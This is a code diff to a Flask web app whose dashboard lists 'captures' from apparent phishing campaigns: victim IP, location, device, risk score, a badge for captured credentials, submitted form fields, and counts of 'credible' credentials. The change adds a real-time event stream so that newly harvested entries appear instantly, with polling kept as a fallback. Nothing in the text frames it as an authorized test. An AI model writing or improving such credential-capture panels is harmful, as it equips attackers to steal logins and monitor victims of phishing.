@@ -105,28 +105,45 @@ td,th{border-bottom:1px solid #30363d;padding:6px 10px;text-align:left}
 <tbody id="rows"><tr><td colspan="8" style="color:#8b949e">loading…</td></tr></tbody></table>
 <div id="stats" class="badge"></div>
 <script>
-function poll(){
-  fetch('/api/captures?limit=20').then(r=>r.json()).then(caps=>{
-    const tb=document.querySelector('#rows');
-    if(!caps.length){tb.innerHTML='<tr><td colspan="6" style="color:#8b949e">no captures yet</td></tr>';return;}
-    tb.innerHTML=caps.map(c=>{
-      const t=new Date(c.ts*1000).toLocaleTimeString();
-      const f=Object.entries(c.fields).slice(0,4).map(([k,v])=>k+'='+v).join('; ');
-      const risk=c.risk||0;
-      const rc=risk>=70?'#f85149':risk>=30?'#d29922':'#3fb950';
-      const rl=risk>=70?'high':risk>=30?'med':'low';
-      return `<tr><td>${t}</td><td>${c.campaign||'—'}</td><td>${c.ip}</td><td>${c.city||c.country||'—'}</td>
-        <td>${c.device}</td><td><span style="color:${rc}">${rl} (${risk})</span></td>
-        <td>${c.is_cred?'<span class="badge">CRED</span>':'·'}</td><td>${f}</td></tr>`;
-    }).join('');
-  });
-  fetch('/api/stats').then(r=>r.json()).then(s=>{
-    document.getElementById('stats').textContent=
-      `captures ${s.total_captures} | creds ${s.credentials} | credible ${s.credible_credentials??'-'} | visitors ${s.visitors}`;
-  });
-  setTimeout(poll, 2000);
+const tb = document.querySelector('#rows');
+function rowHtml(c){
+  const t=new Date(c.ts*1000).toLocaleTimeString();
+  const f=Object.entries(c.fields).slice(0,4).map(([k,v])=>k+'='+v).join('; ');
+  const risk=c.risk||0;
+  const rc=risk>=70?'#f85149':risk>=30?'#d29922':'#3fb950';
+  const rl=risk>=70?'high':risk>=30?'med':'low';
+  return `<tr><td>${t}</td><td>${c.campaign||'—'}</td><td>${c.ip}</td><td>${c.city||c.country||'—'}</td>
+    <td>${c.device}</td><td><span style="color:${rc}">${rl} (${risk})</span></td>
+    <td>${c.is_cred?'<span class="badge">CRED</span>':'·'}</td><td>${f}</td></tr>`;
 }
-poll();
+function setStats(s){
+  document.getElementById('stats').textContent =
+    `captures ${s.total_captures} | creds ${s.credentials} | credible ${s.credible_credentials??'-'} | visitors ${s.visitors}`;
+}
+function fill(){
+  fetch('/api/captures?limit=20').then(r=>r.json()).then(caps=>{
+    if(!caps.length){tb.innerHTML='<tr><td colspan="8" style="color:#8b949e">no captures yet</td></tr>';return;}
+    tb.innerHTML=caps.map(rowHtml).join('');
+  });
+  fetch('/api/stats').then(r=>r.json()).then(setStats);
+}
+let mode='';
+if (window.EventSource){
+  const es = new EventSource('/stream');           // real-time push
+  es.addEventListener('capture', e => {
+    const row = JSON.parse(e.data);
+    if (tb.querySelector('td[colspan]')) tb.innerHTML = '';
+    tb.insertAdjacentHTML('afterbegin', rowHtml(row));
+  });
+  es.addEventListener('stats', e => setStats(JSON.parse(e.data)));
+  es.onopen = () => { mode='stream'; };
+  es.onerror = () => { es.close(); mode='poll'; setInterval(fill, 2000); };  // fallback
+  fill();
+} else {
+  mode='poll';
+  fill();
+  setInterval(fill, 2000);
+}
 </script></body></html>"""
 
     @app.route("/")
@@ -138,6 +155,32 @@ poll();
         limit = int(request.args.get("limit", 20))
         campaign = request.args.get("campaign")
         return jsonify(db.all(limit, campaign=campaign))
+
+    @app.route("/stream")
+    def stream():
+        """Server-Sent Events feed: pushes new captures the moment they land.
+        The page uses EventSource and falls back to polling if the stream drops."""
+        from flask import Response
+
+        def gen():
+            cursor = db.max_id()
+            yield "retry: 3000\n\n"
+            idle = 0
+            while True:
+                rows = db.since(cursor, limit=50)
+                for r in rows:
+                    cursor = max(cursor, r["id"])
+                    yield f"event: capture\ndata: {json.dumps(r, default=str)}\n\n"
+                idle += 1
+                if idle % 2 == 0:                      # ~ every 3s
+                    yield f"event: stats\ndata: {json.dumps(db.stats(), default=str)}\n\n"
+                yield ": keepalive\n\n"
+                time.sleep(1.5)
+
+        return Response(gen(), mimetype="text/event-stream",
+                        headers={"Cache-Control": "no-cache",
+                                 "X-Accel-Buffering": "no",
+                                 "Connection": "keep-alive"})
 
     @app.route("/api/stats")
     def api_stats():
